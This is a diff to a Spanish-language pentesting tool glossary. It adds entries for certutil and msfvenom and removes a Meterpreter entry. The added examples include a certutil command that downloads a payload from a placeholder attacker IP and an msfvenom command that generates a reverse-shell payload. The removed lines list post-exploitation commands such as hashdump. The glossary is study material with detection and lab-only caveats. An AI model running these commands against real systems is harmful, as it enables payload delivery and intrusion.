@@ -9,6 +9,14 @@ Cliente WebDAV de línea de comandos, similar a un cliente FTP para servidores W
 - Ejemplo de conexión: `cadaver http://target.com/webdav/` (luego autenticar si es necesario).  
 - Muy usado en pentesting para probar si un servidor permite **subida de archivos** o gestión remota de ficheros.
 
+### `certutil`
+Herramienta nativa de Windows para **gestionar certificados y realizar operaciones criptográficas**.  
+- Qué hace: ver/instalar/exportar certificados, codificar/decodificar (Base64), calcular hashes y —entre otras opciones— descargar recursos remotos (`-urlcache`).  
+- Casos de uso legítimos, administración de CAs y certificados, ver detalles de un `.cer`, verificar la integridad de archivos mediante hashes.  
+- Riesgo/abuso: su funcionalidad de descarga y codificación se ha aprovechado en ataques *Living off the Land* para traer payloads sin usar binarios externos; por eso conviene monitorizar su uso.
+- Limitaciones: requiere conectividad para descargar; sus operaciones quedan registradas y pueden ser inspeccionadas por EDR/proxy.
+- Ejemplos: `certutil -urlcache -f http://<IP_atacante>/<ruta_payload> <nuevo_nombre>`, `certutil -hashfile <archivo> SHA256`, `certutil -dump <certificado.cer>`
+
 ### `crackmapexec`  
 Framework de post-explotación y enumeración para entornos Windows (CME).  
 - Herramienta en Python que permite **escanear y operar a gran escala** sobre protocolos Windows: SMB, WinRM, LDAP, MSSQL, etc.  
@@ -104,11 +112,13 @@ Plugin de Meterpreter para listar, robar e impersonar *access tokens* en Windows
 - Permite ejecutar acciones con los permisos de otro usuario sin contraseña (útil para escalar privilegios).  
 - Limitaciones: requiere tokens accesibles en memoria y permisos (p. ej. `SeDebugPrivilege`); puede ser detectado por EDR.
 
-### `meterpreter`  
-Payload avanzado de Metasploit que proporciona una sesión interactiva en memoria.  
-- Corre en memoria y usa un canal cifrado víctima→atacante.  
-- Comandos clave: `sysinfo`, `getuid`, `ps`, `pgrep <name>`, `migrate <PID>`, `shell`, `upload`/`download`, `hashdump`.  
-- Uso típico: explotar → recibir sesión Meterpreter → `sysinfo`/`getuid` → `ps` → `migrate` → post-explotación.
+### `msfvenom`
+Herramienta de Metasploit para **generar payloads** en múltiples formatos (PE, DLL, scripts, etc.) usada en pruebas de penetración en entornos controlados.  
+- Combina un payload (identificador) con parámetros (LHOST/LPORT, encoder, formato) y produce un artefacto que, si se ejecuta en un host objetivo, realiza la acción programada por ese payload (en laboratorio: abrir una sesión reversa, bind shell, etc.).  
+- Estructura de payload identifiers: `<platform>[/<arch>]/<family>[/<transport>]` (ej.: `windows/meterpreter/reverse_tcp`, `windows/x64/meterpreter/reverse_tcp`).  
+- Tipos / variantes: meterpreter (post-explotación avanzada), shells básicos (cmd), transportes (reverse_tcp, reverse_https), staged vs stageless; formatos de salida: `exe`, `dll`, `ps1`, `raw`, `elf`, etc.  
+- Ética y seguridad: **solo** usar en VMs/labs autorizados; compartir artifacts o utilizarlos fuera de ese scope puede ser ilegal.
+- Ejemplos: `msfvenom -p <meterpreter> LHOST=<ip_atacante> LPORT=<puerto> -f <extensión> > <nombre_archivo>`
 
 ### `netcraft.com`  
 Servicio en línea de **reconocimiento de infraestructura web**.  
